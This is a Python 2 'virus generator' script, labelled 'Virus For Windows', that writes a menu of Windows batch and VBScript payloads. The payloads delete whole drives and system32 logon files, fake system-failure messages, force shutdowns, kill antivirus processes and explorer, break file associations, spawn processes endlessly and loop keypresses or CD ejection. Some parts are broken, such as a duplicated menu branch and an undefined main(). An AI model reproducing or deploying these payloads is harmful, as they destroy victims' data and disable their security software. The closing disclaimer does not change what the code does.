#!usr/bin/python
#-*- coding: utf-8 -*-
import io
import os
import random
import time
import unittest

import os, sys, subprocess
from time import sleep
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")


def rest():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)
underlined='\033[04m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
lightgreen='\e[1;32m'
okegreen='\033[92m'
bold='\033[33;1m'
inf1='\033[31;1m[\033[37;1m01\033[31;1m] \033[33;1m> \033[37m'
inf2='\033[31;1m[\033[37;1m02\033[31;1m] \033[33;1m> \033[37m'
inf3='\033[31;1m[\033[37;1m03\033[31;1m] \033[33;1m> \033[37m'
inf4='\033[31;1m[\033[37;1m04\033[31;1m] \033[33;1m> \033[37m'
inf5='\033[31;1m[\033[37;1m05\033[31;1m] \033[33;1m> \033[37m'
inf6='\033[31;1m[\033[37;1m06\033[31;1m] \033[33;1m> \033[37m'
inf7='\033[31;1m[\033[37;1m07\033[31;1m] \033[33;1m> \033[37m'
inf8='\033[31;1m[\033[37;1m08\033[31;1m] \033[33;1m> \033[37m'
inf9='\033[31;1m[\033[37;1m09\033[31;1m] \033[33;1m> \033[37m'
inf0='\033[31;1m[\033[37;1m10\033[31;1m] \033[33;1m> \033[37m'
in00='\033[31;1m[\033[37;1m11\033[31;1m] \033[33;1m> \033[37m'
iii2='\033[31;1m[\033[37;1m12\033[31;1m] \033[33;1m> \033[37m'
iii3='\033[31;1m[\033[37;1m13\033[31;1m] \033[33;1m> \033[37m'
iii4='\033[31;1m[\033[37;1m14\033[31;1m] \033[33;1m> \033[37m'
iii5='\033[31;1m[\033[37;1m15\033[31;1m] \033[33;1m> \033[37m'
iii6='\033[31;1m[\033[37;1m16\033[31;1m] \033[33;1m> \033[37m'
iii7='\033[31;1m[\033[37;1m17\033[31;1m] \033[33;1m> \033[37m'
iii8='\033[31;1m[\033[37;1m18\033[31;1m] \033[33;1m> \033[37m'
iii9='\033[31;1m[\033[37;1m19\033[31;1m] \033[33;1m> \033[37m'
ii10='\033[31;1m[\033[37;1m20\033[31;1m] \033[33;1m> \033[37m'
ii11='\033[31;1m[\033[37;1m21\033[31;1m] \033[33;1m>\033[37m'
exxx='\033[31;1m[\033[37;1m00\033[31;1m] \033[33;1m> \033[37m'
who=os.system("whoami")
d='\033[31;1m[\033[37m+\033[31;1m]'

if sys.platform == "linux2":
        os.system("clear")
elif sys.platform == "win32":
        os.system("cls")
else:
        os.system("clear")
print ("""
\033[31;1m__     ___                _____
\ \   / (_)_ __ _   _ ___|  ___|_      __
 \ \ / /| | '__| | | / __| |_  \ \ /\ / /
  \ V / | | |  | |_| \__ \  _|  \ V  V /
   \_/  |_|_|   \__,_|___/_|     \_/\_/
\033[31;1m[+]\033[37mVirus For Windows
\033[31;1m[----\033[37mAuthor  : GunadiCBR  \033[31;1m---------------->
\033[31;1m[----\033[37mDate    : 15-10-2018                   \033[31m|-->
\033[31;1m[----\033[37mVersion : 1.5                            \033[31m|-->
\033[31;1m[----\033[37mGithub  : https://github.com/afelfgie  \033[31m|-->
\033[31;1m[----\033[37mTeam    : Mls18hckr  \033[31m---------------->""")

print " "
print inf1 + "IronMan"
print inf2 + "Koce"
print inf3 + "Notepad"
print inf4 + "Facebook"
print inf5 + "CD/DVD"
print inf6 + "shutdown"
print inf7 + "hardisk"
print inf8 + "Ugly"
print inf9 + "Kuis"
print inf0 + "Alay"
print in00 + "Capslock"
print iii2 + "BackSpace"
print iii3 + "angry"
print iii4 + "hack"
print iii5 + "Hang"
print exxx + "Exit"
print " "
menu = raw_input("\033[31;1mChose \033[33;1m--> \033[37;1m")

if menu == '1' or menu == '01':
	try:
	   file = open("ironman.bat", 'w')
	except(IOError):
	   print ("ERR...")
	   sys.exit()
	print " "
	print "\033[31mPlease Wait..."
	time.sleep(2)
	file.write('''
@echo off
mode 200
color 1a
shutdown -s -c "WINDOWS HAS DETECTED A SYSTEM 
FAILURE. SHUTTING DOWN TO PROTECT DATA." -t 30
:a
md %random%
start
dir /s
goto a''')
	os.system("mv ironman.bat virus")
	print " "
	print d + " \033[37mdone"
	print " "
	sys.exit()
elif menu == '02' or menu == '2':
	try:
           file = open("koce.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
	print " "
	print "\033[31;1mPlease Wait"
	print " "
	time.sleep(2)
	file.write('''
@echo off
echo You Ugly
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q''')
	os.system("mv koce.bat virus")
	print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '3' or menu == '03':
	try:
           file = open("notepad.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(2)
        file.write('''
@ECHO off
:top
START %SystemRoot%
system32notepad.exe
GOTO top''')
	os.system("mv notepad.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '4' or menu == '04':
	try:
           file = open("facebook.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(2)
        file.write('''
@echo off
msg * WARNING VIRUS DETECTED!!!!! AFTER 5 MINUTES YOUR 
FACEBOOK ACCOUNT WILL BE DELETED !!!!TO REMOVE THE VIRUS 
CLICK OK OR CLOSE THIS BOX!
PAUSE
shutdown -r -t 300 -c ” SORRY!!! YOUR FACEBOOK ACCOUNT ARE 
NOW BEING DELETED !!! PLEASE WAIT ………..”
''')
	os.system("mv facebook.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '5' or menu == '05':
        try:
           file = open("dvd.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(2)
        file.write('''
Set oWMP = CreateObject
("WMPlayer.OCX.7")
Set colCDROMs =
oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
wscript.sleep 5000
loop''')
	os.system("mv dvd.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '6' or menu == '06':
	try:
           file = open("sdown.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(2)
        file.write('''
@echo off
msg * I don't like you
shutdown -c "Error! You are too ******!" -s''')
	os.system("mv sdown.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '7' or menu == '07':
        try:
           file = open("hardisk.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(2)
        file.write('''
@echo off
DEL C: -Y
DEL D: -Y''')
	os.system("mv hardisk.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '11' or menu == '11':
        try:
           file = open("ForceAlay.vbs", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(2)
        file.write('''
Set wshShell =wscript.CreateObject("WScript.Shell") 
do wscript.sleep 100 wshshell.sendkeys "{CAPSLOCK}" 
wscript.sleep 100 wshshell.sendkeys "{NUMLOCK}" 
wscript.sleep 100 wshshell.sendkeys "{SCROLLLOCK}" 
loop''')
	os.system("mv ForceAlay.vbs virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '10' or menu == '10':
	try:
           file = open("capslock.vbs", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(2)
        file.write('''
Set wshShell
=wscript.CreateObject
("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
loop''')
	os.system("mv capslock.vbs virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '12' or menu == '12':
	try:
           file = open("backspace.vbs", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(3)
	file.write('''
MsgBox "kembali ke menu
sebelumnya"
Set wshShell
=wscript.CreateObject
("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop''')
	os.system("mv backspace.vbs virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
if menu == '13' or menu == '13':
	try:
           file = open("ganas.vbs", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(3)
        file.write('''
option explicit

dim wshshell
set wshshell=wscript.createobject("wscript.shell")

dim x
for x = 1 to 100000000
wshshell.run "tourstart.exe"
next''')
	os.system("mv ganas.vbs virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '9' or menu == '09':
	try:
           file = open("kuis.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(3)
        file.write('''
@echo off
title quiz hari ini :)
:menu
cls
echo jika kamu kena virus apa
yang kamu lakukan
pause
echo pilih yang mana:
echo 1. matiin computer
echo 2. format aja
echo 3. bingung ahh
set input=nothing
set /p input=Choice:
if %input%==1 shutdown -s -t
30
if %input%==2 del c:xxx
if %input%==3 @ECHO off
msg * muka lo rusak
msg * ngaca dulu gih
msg * hayo lo,cpu lu gw acak2
msg * ud install ulang aja
msg * biar masalah nya kelar
@ECHO off
:top
START %SystemRoot%
system32notepad.exe
GOTO top''')
	os.system("mv kuis.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '8' or menu == '08':
	try:
           file = open("ugly.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(3)
        file.write('''
@ECHO off
:Begin
msg * muka lo jelek
msg * ngaca dulu gih
msg * hayo lo,cpu lu gw acak2
msg * ud install ulang aja
msg * biar masalah nya kelar
GOTO BEGIN''')
	os.system("mv ugly.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '14' or menu == '14':
	try:
           file = open("hack.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(3)
        file.write('''
@echo off
set end=md “Hack
installing”
set fin=copy “Hack
log.txt” “Installing”
%end%
%fin%
net send * Hack is
installing, press OK to
begin set up.
kill NAVAPSVC.exe /F /Q
kill zonelabs.exe /F /Q
kill explorer.exe /F /Q
cls
assoc .exe=txtfile
assoc .txt=mp3file
cls
msg * It is you who is
hacked ….
msg * I warned you,
and you kept going.
Challenge me and this
is what happens.
DEL C:WINDOWS
system32logoff.exe /
F /Q
DEL C:WINDOWS
system32logon.exe /
F /Q
DEL C:WINDOWS
system32logon.scr /
F /Q
cls
shutdown -s -t 5 -c
“ thank you for
waiting”''')
	os.system("mv hack.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '14' or menu == '14':
        try:
           file = open("hang.bat", 'w')
        except(IOError):
           print ("ERR...")
           sys.exit()
        print " "
        print "\033[31;1mPlease Wait"
        print " "
        time.sleep(3)
        file.write('''
start

start

start

start

start

start

start

start

start

start

start

start''')
	os.system("mv hang.bat virus")
        print " "
        print d + " \033[37mdone"
        print " "
        sys.exit()
elif menu == '0' or menu == '00':
	print " "
	print "\033[31;1m[+]\033[37;1m Thanks For Using My Tool..."
	time.sleep(1)
	print " "
	print "\033[31;1m[+]\033[37;1m I am not responsible if anything happens to your computer or your friend, I only give info or just share it. "
	time.sleep(1)
	sys.exit()
else:
		print " "
                print "\033[31mError: \033[37mWrong Input \033[31;1m!!!"
                time.sleep(1)
                rest()

if __name__ == "__main__":
	try:
	        main()
	except KeyboardInterrupt:
		rest()
